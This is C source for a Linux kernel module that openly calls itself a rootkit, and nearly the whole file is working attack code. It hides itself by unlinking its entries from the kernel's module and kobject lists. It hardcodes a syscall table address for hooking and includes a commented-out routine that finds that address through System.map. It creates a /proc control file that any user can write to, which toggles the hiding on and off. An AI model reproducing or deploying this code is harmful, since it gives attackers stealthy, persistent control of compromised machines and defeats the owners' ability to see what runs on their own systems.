#include "ker_mod.h"

static struct proc_dir_entry *proc_rtkit;
static struct proc_dir_entry *proc_root;

static char module_hidden = 0;
static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static int temp;
static char desc[50];

// unsigned long *syscall_table = NULL;
// found with grep sys_call_table /boot/System.map-4.* | head -n 1 | awk '{print $1}'
unsigned long *syscall_table = (unsigned long *)0xffffffff816001e0;
asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
/*
static int find_sys_call_table (char *kern_ver) {
    char system_map_entry[MAX_VERSION_LEN];
    int i = 0;

    /*
     * Holds the /boot/System.map-<version> file name as we build it
     *
    char *filename;

    /*
     * Length of the System.map filename, terminating NULL included
     *
    size_t filename_length = strlen(kern_ver) + strlen(BOOT_PATH) + 1;

    /*
     * This will point to our /boot/System.map-<version> file
     *
    struct file *f = NULL;

    mm_segment_t oldfs;

    oldfs = get_fs();
    set_fs (KERNEL_DS);

    printk(KERN_EMERG "Kernel version: %s\n", kern_ver);

    filename = kmalloc(filename_length, GFP_KERNEL);
    if (filename == NULL) {
        printk(KERN_EMERG "kmalloc failed on System.map-<version> filename allocation");
        return -1;
    }

    /*
     * Zero out memory to be safe
     *
    memset(filename, 0, filename_length);

    /*
     * Construct our /boot/System.map-<version> file name
     *
    strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));
    strncat(filename, kern_ver, strlen(kern_ver));

    /*
     * Open the System.map file for reading
     *
    f = filp_open(filename, O_RDONLY, 0);
    if (IS_ERR(f) || (f == NULL)) {
        printk(KERN_EMERG "Error opening System.map-<version> file: %s\n", filename);
        return -1;
    }

    memset(system_map_entry, 0, MAX_VERSION_LEN);

    /*
     * Read one byte at a time from the file until we either max out
     * out our buffer or read an entire line.
     *
    while (vfs_read(f, system_map_entry + i, 1, &f->f_pos) == 1) {
        /*
         * If we've read an entire line or maxed out our buffer,
         * check to see if we've just read the sys_call_table entry.
         *
        if ( system_map_entry[i] == '\n' || i == MAX_VERSION_LEN ) {
            // Reset the "column"/"character" counter for the row
            i = 0;

            if (strstr(system_map_entry, "sys_call_table") != NULL) {
                char *sys_string;
                char *system_map_entry_ptr = system_map_entry;

                sys_string = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);
                if (sys_string == NULL) {
                    filp_close(f, 0);
                    set_fs(oldfs);

                    kfree(filename);

                    return -1;
                }

                memset(sys_string, 0, MAX_VERSION_LEN);

                strncpy(sys_string, strsep(&system_map_entry_ptr, " "), MAX_VERSION_LEN);

                //syscall_table = (unsigned long long *) kstrtoll(sys_string, NULL, 16);
                //syscall_table = kmalloc(sizeof(unsigned long *), GFP_KERNEL);
                //syscall_table = kmalloc(sizeof(syscall_table), GFP_KERNEL);
                kstrtoul(sys_string, 16, &syscall_table);
                printk(KERN_EMERG "syscall_table retrieved\n");

                kfree(sys_string);

                break;
            }

            memset(system_map_entry, 0, MAX_VERSION_LEN);
            continue;
        }

        i++;
    }

    filp_close(f, 0);
    set_fs(oldfs);

    kfree(filename);

    return 0;
}
*/

char *acquire_kernel_version (char *buf) {
    struct file *proc_version;
    char *kernel_version;

    /*
     * We use this to store the userspace perspective of the filesystem
     * so we can switch back to it after we are done reading the file
     * into kernel memory
     */
    mm_segment_t oldfs;

    /*
     * Standard trick for reading a file into kernel space
     * This is very bad practice. We're only doing it here because
     * we're malicious and don't give a damn about best practices.
     */
    oldfs = get_fs();
    set_fs (KERNEL_DS);

    /*
     * Open the version file in the /proc virtual filesystem
     */
    proc_version = filp_open(PROC_V, O_RDONLY, 0);
    if (IS_ERR(proc_version) || (proc_version == NULL)) {
        return NULL;
    }

    /*
     * Zero out memory just to be safe
     */
    memset(buf, 0, MAX_VERSION_LEN);

    /*
     * Read version info from /proc virtual filesystem
     */
    vfs_read(proc_version, buf, MAX_VERSION_LEN, &(proc_version->f_pos));

    /*
     * Extract the third field from the full version string
     */
    kernel_version = strsep(&buf, " ");
    kernel_version = strsep(&buf, " ");
    kernel_version = strsep(&buf, " ");

    filp_close(proc_version, 0);

    /*
     * Switch filesystem context back to user space mode
     */
    set_fs(oldfs);

    return kernel_version;
}

void module_hide(void)
{
		/* The module is already hidden, do nothing. */
		if(module_hidden) return;

		module_previous = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list);
		module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
		// kobject_del(&THIS_MODULE->mkobj.kobj);
		list_del(&THIS_MODULE->mkobj.kobj.entry);
		module_hidden = !module_hidden;
		printk(KERN_INFO "Module hidden\n");
}

void module_show(void)
{
		/* The module is not hidden yet, nothing more to show. */
		if(!module_hidden) return;

		list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
		// kobject_init(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.ktype);
		// kobject_add(&THIS_MODULE->mkobj.kobj,
		// 	THIS_MODULE->mkobj.kobj.parent, MODULE_NAME);
		list_add(&THIS_MODULE->list, module_previous);
		// mod_sysfs_setup(&THIS_MODULE, NULL, &THIS_MODULE->kp, 0);
		module_hidden = !module_hidden;
		printk(KERN_INFO "Module no longer hidden\n");
}

static ssize_t rtkit_read(struct file *file, char __user *buffer,
													size_t count, loff_t *ppos)
{
		if(count > temp)
				count = temp;
		temp -= count;

		copy_to_user(buffer, desc, count);

		if(count == 0) {
				sprintf(desc, "test\n");
				temp = strlen(desc);
		}

		return count;
}

static ssize_t rtkit_write(struct file *file, const char __user *buffer,
													 size_t count, loff_t *ppos)
{
		if(!strncmp(buffer, HIDE_MOD_CMD, strlen(HIDE_MOD_CMD))) {
				module_hide();
		} else if(!strncmp(buffer, SHOW_MOD_CMD, strlen(SHOW_MOD_CMD))) {
				module_show();
		}
		return count;
}

static const struct file_operations rootkit_fops = {
		.owner = THIS_MODULE,
		.read = rtkit_read,
		.write = rtkit_write,
};

/* Initialize proc file system */
static int procfs_init(void)
{
		proc_rtkit = proc_create(MODULE_NAME, 0666, NULL, &rootkit_fops);
		if(proc_rtkit == NULL)
				return 0;
		proc_root = proc_rtkit->parent;
		if(proc_root == NULL || strcmp(proc_root->name, "/proc") != 0)
				return 0;

		sprintf(desc, "test\n");
		temp = strlen(desc);

		return 1;
}

static void procfs_clean(void)
{
		if(proc_rtkit != NULL) {
				remove_proc_entry(MODULE_NAME, NULL);
				proc_rtkit = NULL;
		}
}

/* Init function, called when the module is loaded */
static int __init rootkit_init(void)
{
		if(!procfs_init()) {
				procfs_clean();
				return 1;
		}
		printk(KERN_INFO "Loading rootkit\n");
		return 0;
}

/* Exit function, called when the module is unloaded */
static void __exit rootkit_exit(void)
{
		module_show();
		procfs_clean();
		module_hide();
		printk(KERN_INFO "Closing rootkit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
